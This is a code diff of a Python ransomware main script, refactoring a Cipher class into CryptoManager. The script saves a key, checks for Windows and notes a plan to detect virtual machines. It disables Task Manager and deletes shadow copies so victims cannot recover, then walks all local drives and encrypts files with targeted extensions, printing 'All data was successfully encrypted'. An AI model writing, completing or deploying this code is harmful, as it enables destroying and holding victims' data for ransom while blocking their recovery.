@@ -1,4 +1,4 @@
-from Cipher import Cipher
+from .CryptoManager import CryptoManager
 import os
 import sys
 
@@ -18,35 +18,35 @@ import sys
 
 if __name__ == '__main__':
     print("Executing encryption protocol")
-    cipher = Cipher(action='encrypt')
-    cipher.save_key_as_file()
+    cm = CryptoManager(action='encrypt')
+    cm.save_key_as_file()
 
     # TODO necesitamos no crear nada antes de detectar si estamos ejecutando en un windows o en una virtual machine
-    if not cipher.is_windows():
+    if not cm.is_windows():
         print('Nothing to do here')
         # cleanup protocol here
         sys.exit()
 
     # TODO try except needed
     # WORKING PROPERLY
-    cipher.disable_task_manager()
-    cipher.delete_shadowcopies()
+    cm.disable_task_manager()
+    cm.delete_shadowcopies()
     print("Task manager disbled and shadow copies eliminated")
     input("Press enter to end")
 
     sys.exit()
 
-    local_drives = cipher.get_local_drives()
+    local_drives = cm.get_local_drives()
     
     for ld in local_drives:
         for root, dirs, files in os.walk(ld):
-            [dirs.remove(d) for d in list(dirs) if d in cipher.PROTECTED_DIRS]
+            [dirs.remove(d) for d in list(dirs) if d in cm.PROTECTED_DIRS]
             for fn in files:
                 full_path = root + os.sep + fn
-                ext=cipher.get_file_extension(full_path)
-                if ext in cipher.TARGET_EXT and ext not in cipher.EXCLUDED_EXT:
+                ext=cm.get_file_extension(full_path)
+                if ext in cm.TARGET_EXT and ext not in cm.EXCLUDED_EXT:
                     print(full_path + ' -> [encrypted]')
-                    cipher.symmetric_encrypt_or_decrypt(full_path)
+                    cm.symmetric_encrypt_or_decrypt(full_path)
 
     print('All data was successfully encrypted')
 
